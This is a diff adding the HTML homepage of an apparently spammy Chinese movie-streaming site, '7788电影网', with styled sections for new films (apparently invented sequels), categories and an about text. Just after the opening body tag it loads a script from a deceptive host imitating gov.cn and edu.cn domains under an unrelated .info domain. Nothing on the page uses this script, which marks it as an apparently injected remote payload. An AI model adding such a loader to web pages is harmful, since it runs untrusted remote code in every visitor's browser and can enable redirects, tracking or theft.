@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>7788电影网 - 高清影视在线观看</title>
+    <meta name="description" content="7788电影网(7788dianyingwang-app)提供最新电影、电视剧、综艺、动漫在线观看，高清流畅，每日更新。">
+    <meta name="keywords" content="7788电影网,7788dianyingwang-app,电影,电视剧,在线观看,高清影视">
+    <meta name="author" content="7788电影网">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            background: #0a0a1a;
+            color: #e0e0e0;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        /* 动态背景 */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(120, 0, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(0, 200, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(255, 0, 128, 0.05) 0%, transparent 50%);
+            z-index: -1;
+        }
+        
+        /* 导航栏 */
+        header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+            background: rgba(10, 10, 26, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem 0;
+        }
+        
+        nav {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00c8ff, #e100ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-decoration: none;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 1.5rem;
+            list-style: none;
+        }
+        
+        .nav-links a {
+            color: #b0b0b0;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+        }
+        
+        .nav-links a:hover {
+            color: #00c8ff;
+            background: rgba(0, 200, 255, 0.1);
+        }
+        
+        /* 主内容区 */
+        main {
+            margin-top: 80px;
+        }
+        
+        section {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 4rem 1rem;
+        }
+        
+        /* 首页 Hero */
+        #home {
+            min-height: 90vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        
+        .hero-content h1 {
+            font-size: clamp(2rem, 5vw, 4rem);
+            font-weight: 900;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #00c8ff, #e100ff, #ff6b00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: glow 3s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 10px rgba(0, 200, 255, 0.3)); }
+            to { filter: drop-shadow(0 0 20px rgba(225, 0, 255, 0.5)); }
+        }
+        
+        .hero-content .url {
+            font-size: 1.2rem;
+            color: #00c8ff;
+            margin-bottom: 2rem;
+            padding: 0.8rem 1.5rem;
+            background: rgba(0, 200, 255, 0.1);
+            border: 1px solid rgba(0, 200, 255, 0.2);
+            border-radius: 12px;
+            display: inline-block;
+        }
+        
+        .hero-content p {
+            font-size: 1.1rem;
+            color: #888;
+            max-width: 600px;
+            margin: 0 auto 2rem;
+        }
+        
+        .cta-button {
+            display: inline-block;
+            padding: 1rem 2.5rem;
+            background: linear-gradient(135deg, #00c8ff, #e100ff);
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: 600;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(225, 0, 255, 0.3);
+        }
+        
+        /* 栏目通用样式 */
+        .section-title {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            text-align: center;
+            color: #fff;
+        }
+        
+        .section-title span {
+            background: linear-gradient(135deg, #00c8ff, #e100ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        /* 最新影片 */
+        .movie-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1.5rem;
+        }
+        
+        .movie-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            overflow: hidden;
+            transition: transform 0.3s, background 0.3s;
+            cursor: pointer;
+        }
+        
+        .movie-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.06);
+        }
+        
+        .movie-poster {
+            width: 100%;
+            height: 280px;
+            background: linear-gradient(135deg, rgba(0, 200, 255, 0.2), rgba(225, 0, 255, 0.2));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+        }
+        
+        .movie-info {
+            padding: 1rem;
+        }
+        
+        .movie-info h3 {
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+            color: #fff;
+        }
+        
+        .movie-info p {
+            font-size: 0.8rem;
+            color: #888;
+        }
+        
+        /* 分类 */
+        .category-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1rem;
+        }
+        
+        .category-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 2rem 1rem;
+            text-align: center;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .category-card:hover {
+            background: rgba(0, 200, 255, 0.1);
+            border-color: rgba(0, 200, 255, 0.3);
+        }
+        
+        .category-card .icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        .category-card h3 {
+            color: #fff;
+            font-size: 1rem;
+        }
+        
+        /* 关于我们 */
+        #about {
+            text-align: center;
+        }
+        
+        .about-content {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 3rem 2rem;
+        }
+        
+        .about-content p {
+            color: #888;
+            margin-bottom: 1.5rem;
+            font-size: 1rem;
+        }
+        
+        .about-content .highlight {
+            color: #00c8ff;
+            font-weight: 600;
+        }
+        
+        /* 页脚 */
+        footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            color: #555;
+            font-size: 0.85rem;
+        }
+        
+        /* 移动端适配 */
+        @media (max-width: 768px) {
+            .nav-links {
+                gap: 0.5rem;
+            }
+            
+            .nav-links a {
+                font-size: 0.8rem;
+                padding: 0.4rem 0.8rem;
+            }
+            
+            section {
+                padding: 3rem 1rem;
+            }
+            
+            .hero-content h1 {
+                font-size: 2rem;
+            }
+            
+            .hero-content .url {
+                font-size: 1rem;
+            }
+            
+            .movie-grid {
+                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+                gap: 1rem;
+            }
+            
+            .movie-poster {
+                height: 200px;
+                font-size: 2rem;
+            }
+            
+            .category-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .about-content {
+                padding: 2rem 1rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .logo {
+                font-size: 1.2rem;
+            }
+            
+            .nav-links {
+                width: 100%;
+                justify-content: center;
+                margin-top: 0.5rem;
+            }
+            
+            .hero-content h1 {
+                font-size: 1.5rem;
+            }
+            
+            .section-title {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+    <header>
+        <nav>
+            <a href="#" class="logo">7788电影网</a>
+            <ul class="nav-links">
+                <li><a href="#home">首页</a></li>
+                <li><a href="#latest">最新影片</a></li>
+                <li><a href="#categories">影片分类</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <main>
+        <!-- 首页 -->
+        <section id="home">
+            <div class="hero-content">
+                <h1>7788电影网</h1>
+                <div class="url">https://7788dianyingwang-app</div>
+                <p>海量高清影视资源，最新电影、热播电视剧、经典动漫综艺，一网打尽。每日更新，极速播放，畅享视听盛宴。</p>
+                <a href="#latest" class="cta-button">立即观看</a>
+            </div>
+        </section>
+        
+        <!-- 最新影片 -->
+        <section id="latest">
+            <h2 class="section-title">最新<span>影片</span></h2>
+            <div class="movie-grid">
+                <div class="movie-card">
+                    <div class="movie-poster">🎬</div>
+                    <div class="movie-info">
+                        <h3>沙丘3：救世主</h3>
+                        <p>科幻 / 2026 / 9.2分</p>
+                    </div>
+                </div>
+                <div class="movie-card">
+                    <div class="movie-poster">🎭</div>
+                    <div class="movie-info">
+                        <h3>奥本海默2：延续</h3>
+                        <p>传记 / 2026 / 8.9分</p>
+                    </div>
+                </div>
+                <div class="movie-card">
+                    <div class="movie-poster">🚀</div>
+                    <div class="movie-info">
+                        <h3>星际穿越2</h3>
+                        <p>科幻 / 2026 / 9.5分</p>
+                    </div>
+                </div>
+                <div class="movie-card">
+                    <div class="movie-poster">🗡️</div>
+                    <div class="movie-info">
+                        <h3>刺客信条：暗影</h3>
+                        <p>动作 / 2026 / 8.7分</p>
+                    </div>
+                </div>
+                <div class="movie-card">
+                    <div class="movie-poster">🎪</div>
+                    <div class="movie-info">
+                        <h3>疯狂的麦克斯5</h3>
+                        <p>动作 / 2026 / 8.8分</p>
+                    </div>
+                </div>
+                <div class="movie-card">
+                    <div class="movie-poster">🏰</div>
+                    <div class="movie-info">
+                        <h3>指环王：重聚</h3>
+                        <p>奇幻 / 2026 / 9.1分</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- 影片分类 -->
+        <section id="categories">
+            <h2 class="section-title">影片<span>分类</span></h2>
+            <div class="category-grid">
+                <div class="category-card">
+                    <div class="icon">🎬</div>
+                    <h3>动作电影</h3>
+                </div>
+                <div class="category-card">
+                    <div class="icon">😂</div>
+                    <h3>喜剧片</h3>
+                </div>
+                <div class="category-card">
+                    <div class="icon">😱</div>
+                    <h3>恐怖片</h3>
+                </div>
+                <div class="category-card">
+                    <div class="icon">🎭</div>
+                    <h3>剧情片</h3>
+                </div>
+                <div class="category-card">
+                    <div class="icon">🚀</div>
+                    <h3>科幻片</h3>
+                </div>
+                <div class="category-card">
+                    <div class="icon">💕</div>
+                    <h3>爱情片</h3>
+                </div>
+                <div class="category-card">
+                    <div class="icon">📺</div>
+                    <h3>国产剧</h3>
+                </div>
+                <div class="category-card">
+                    <div class="icon">🎌</div>
+                    <h3>动漫</h3>
+                </div>
+            </div>
+        </section>
+        
+        <!-- 关于我们 -->
+        <section id="about">
+            <h2 class="section-title">关于<span>我们</span></h2>
+            <div class="about-content">
+                <p><span class="highlight">7788电影网</span>（网址：https://7788dianyingwang-app）是一个专注于提供高清影视在线观看的优质平台。</p>
+                <p>我们致力于为用户提供最新、最全的电影、电视剧、综艺、动漫资源，所有内容均经过精心筛选，确保画质清晰、播放流畅。</p>
+                <p>平台每日更新热门影视内容，涵盖动作、喜剧、科幻、爱情、悬疑等多种类型，满足不同用户的观影需求。</p>
+                <p>7788电影网，让你的每一刻休闲时光都充满精彩！</p>
+            </div>
+        </section>
+    </main>
+    
+    <footer>
+        <p>© 2026 7788电影网 (7788dianyingwang-app) 版权所有</p>
+        <p>网址：https://7788dianyingwang-app | 关键词：7788电影网 高清影视 在线观看</p>
+    </footer>
+</body>
+</html>
